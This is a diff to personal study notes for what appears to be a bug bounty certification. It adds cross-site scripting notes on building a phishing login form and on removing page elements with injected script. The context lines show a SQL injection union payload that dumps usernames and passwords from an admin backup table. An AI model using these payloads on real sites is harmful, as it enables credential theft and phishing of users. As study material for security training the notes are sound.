@@ -40,3 +40,12 @@ Stuff for CBBH
 
     #Get data from whithin another database
     '+union+select+1,username,password,4,5+from+backup.admin_bk--+-
+
+  Cross-Site Scripting
+
+    #When creating a phishing form the submit button has to be just like so
+    <input type="submit" name="submit" value="login">
+
+    #That's a way to remove unanted html stuff from the page [gotta wrap it between script tags]
+    document.getElementById("id-here").remove();
+    
